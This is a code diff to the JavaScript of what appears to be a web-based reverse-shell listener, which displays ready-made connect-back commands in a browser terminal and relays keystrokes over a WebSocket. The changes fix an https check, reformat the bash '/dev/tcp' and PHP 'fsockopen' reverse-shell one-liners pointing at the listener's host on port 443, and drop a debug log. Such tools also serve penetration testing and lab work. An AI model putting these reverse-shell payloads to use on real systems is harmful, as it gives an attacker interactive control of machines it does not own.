@@ -20,7 +20,7 @@
         function main() {
             prefix = "";
             protocol = "ws";
-            if (location.protocol === "https") {
+            if (location.protocol === "https:") {
                 protocol = "wss";
             }
             token = token(16);
@@ -29,8 +29,8 @@
             term.open(document.getElementById('terminal'));
             term.fit();
             term.writeln("token: " + token);
-            term.writeln("bash: `(echo " + token + " ;bash -i) >& /dev/tcp/" + prefix + window.location.hostname + "/443 0>&1`");
-            term.writeln("php: `php -r '$sock=fsockopen(\"" + prefix + window.location.hostname + "\",443);exec(\"(echo " + token + ";/bin/bash -i) <&3 >&3 2>&3\");'`");
+            term.writeln("bash: bash -c \"(echo " + token + ";bash -i) >& /dev/tcp/" + prefix + window.location.hostname + "/443 0>&1\"");
+            term.writeln("php: php -r '$sock=fsockopen(\"" + prefix + window.location.hostname + "\",443);exec(\"(echo " + token + ";/bin/bash -i) <&3 >&3 2>&3\");'");
             var conn;
             var ctrl = false;
             var alt = false;
@@ -48,7 +48,6 @@
             terminal.onkeyup = function (e) {
                 if (!e) e = window.event;
                 var keyCode = e.keyCode || e.which;
-                console.log(keyCode);
 
                 if (ctrl && keyCode === 67) {// Ctr + C
                     conn.send(String.fromCharCode(3));
